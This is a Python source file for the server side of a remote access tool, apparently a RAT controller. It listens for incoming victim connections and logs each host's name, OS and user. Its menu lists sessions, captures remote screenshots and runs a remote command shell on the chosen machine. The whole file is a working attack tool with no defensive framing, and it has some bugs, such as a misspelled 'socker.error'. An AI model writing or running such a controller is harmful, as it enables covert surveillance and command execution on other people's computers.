import socket, os, time, threading, sys
from queue import Queue

arrconn =[]
arrAdd = []
intThread = 2
arrjob = [1,2]
queue = Queue()
intbuffer = 1024
largebuf=4096
HOST = "127.0.0.1"
PORT = 1234

decode_utf = lambda data: data.decode("utf-8")

remove_quote = lambda string: string.replace("\"","")

send = lambda data:conn.send(data)
recv = lambda data:conn.recv(data)

def recvall(buffer):
    Data = b""
    while True:
        Data_part = recv(buffer)
        if(len(Data_part)==buffer):
            return Data_part
        Data += Data_part

        if(len(Data)==buffer):
            return Data

def create_sock():
    global server_socket
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    except socker.error() as strError:
        print("Error"+str(strError))

def socket_bind():
    global server_socket
    try:
        print("Listening on port " + str(PORT))
        server_socket.bind((HOST, PORT))
        server_socket.listen(20)

    except socket.error() as strError:
        print("error "+str(strError))
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = server_socket.accept()
            conn.setblocking(1) # no block
            arrconn.append(conn)
            client_info = decode_utf(conn.recv(intbuffer))

            address += client_info[0], client_info[1], client_info[2]

            arrAdd.append(address)
            print("\n"+f"connn succsess : {address[0]} {address[2]}")
        except socket.error:
            print("error accrpt conn")

def create_thread():
    for _ in range(intThread):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()
    queue.join()


def create_jobs():
    for intthreads in arrjob:
        queue.put(intthreads)
    queue.join()

def work():
    while True:
        val = queue.get()
        if val == 1:
            create_sock()
            socket_bind()
            socket_accept()

        elif val ==2:
            main_help()
            while True:
                time.sleep(0.2)
                if len(arrconn)>0:
                    main_menu()
                    break

        queue.task_done()
        queue.task_done()
        sys.exit(0)

def main_help():
    print("\n-------------help------------------\n")
    print("--l list all conn")
    print("--x close")
    print("--i conn id")
    print("--p take screen")
    print("--c command shell")
 
def main_menu():
    while True:
        choice = input("\n>> ")
        if(choice == "--l"):
            list_conn()
        elif choice == "--p":
            screen_shot()
        elif choice[:3] == "--i" and (len(choice)>3):
            conn = select_connection((choice[4:]),"True")
        elif(choice == "--x"):
            close()
            break
        elif(choice == "--c"):
            command_shell()
        else:
            print("invalid")

def close():
    global arrconn, arrAdd
    if(len(arrAdd) == 0):
        return
    
    for intcounter , conn in enumerate(arrconn):
        conn.send(str.encode("exit"))
        conn.close()

        del arrconn;arrconn = []
        del arrAdd; arrAdd = []


def list_conn():
    if len(arrconn) > 0:
        strClient = "number\tIP\n"
        for intcoun, conn in enumerate(arrconn):
            strClient += f"{intcoun}\t{arrAdd[intcoun][0]}\t{arrAdd[intcoun][1]}\t{arrAdd[intcoun][2]}\n"
    print(strClient)

def conn_menu():
    print("\n-------------connection menu------------------\n")
    print("--x close")
    print("--p take screen")
    print("--c command shell")

def select_connection(connection_id,bInGetResponese):
    conn_menu()
    global conn,arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrconn[connection_id]

    except:
        print("invalid choice please try again")
        return
    else:
        #[ip. port. pc name, os, user]
        arrInfo = str(arrAdd[connection_id][0]),str(arrAdd[connection_id][2]),

        if bInGetResponese == "True":
            print("you ar connect to "+ arrInfo[0]+ "......"+"\n")
        return conn

def send_commands():
    while True:
        choice = input("\n Type Selection: ")
        if choice[:3] == "--m" and len(choice) > 3:
            msg = "msg" + choice[4:]
            send(str.encode(msg))


def screen_shot():
    print("\nstart screen\n")
    send(str.encode("screen_shot"))
    #recv
    resonse = decode_utf(recv(intbuffer))
    print(resonse)

    sizebuf =""
    #check size
    for i in range(0,len(resonse)):
        if resonse[i].isdigit():
            sizebuf += resonse[i]
    print(sizebuf)
    sizebuf = int(sizebuf)

    pic_buf = recvall(sizebuf)
    with open(os.getcwd()+"s.png","wb") as pic_fd:
        pic_fd.write(pic_buf) 
        pic_fd.close()

    print("END ==112!%#$!*%@(*%(!@#$)*!@#$!@(#$))")



def command_shell():
    send(str.encode("cmd"))
    while True:
        recv_pwd = decode_utf(recv(intbuffer)) #get cwd
        command = input("cmd "+recv_pwd+"> ")
        if command == "exit_cmd":
            send(str.encode("exit_cmd"))
            break
        elif command[:2] == "cd":
            send(str.encode(command))
            print("change directory to" + command[2:])
        elif len(command)>0:
            
            send(str.encode(command))
            

            out_command = (recv(largebuf))
            print(out_command.decode(encoding='CP949'))
#.decode(encoding='CP949')


create_thread()
create_jobs()